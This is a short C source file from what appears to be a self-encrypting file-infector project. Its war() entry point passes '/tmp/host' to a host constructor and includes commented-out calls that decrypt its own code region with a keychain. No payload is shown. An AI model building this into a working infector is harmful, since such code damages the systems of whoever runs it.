#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void war(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
	const char filename[] = "/tmp/host";

//	update_keychain_left(&keychain, (char *)__entry, (void *)host_constructor - (void *)__entry);
//	decrypt_left(&keychain, (char *)&host_constructor, (void *)&criteria - (void *)&host_constructor);

	host_constructor(host, keychain, filename, context);
}
